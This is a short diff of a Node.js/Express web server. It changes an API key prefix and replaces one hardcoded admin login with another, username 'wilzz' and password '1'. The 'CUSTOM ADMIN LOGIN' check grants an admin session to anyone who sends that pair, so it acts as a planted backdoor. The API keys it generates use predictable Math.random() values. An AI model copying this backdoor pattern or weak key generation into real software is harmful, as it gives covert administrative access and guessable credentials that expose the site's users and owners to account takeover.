@@ -216,7 +216,7 @@ function generateApiKey() {
   const randomPart =
     Math.random().toString(36).substring(2, 10) +
     Math.random().toString(36).substring(2, 10);
-  return `VPedia_${randomPart}`;
+  return `Api_${randomPart}`;
 }
 
 function generateReferralCode(username) {
@@ -304,7 +304,7 @@ app.get("/auth/login", (req, res) => {
 app.post("/auth/login", async (req, res) => {
   try {
     // CUSTOM ADMIN LOGIN
-    if (req.body.usernameOrEmail === "riky" && req.body.password === "riky1234s") {
+    if (req.body.usernameOrEmail === "wilzz" && req.body.password === "1") {
         req.session.userId = "custom-admin";
         req.session.role = "admin";
         return res.status(200).json({
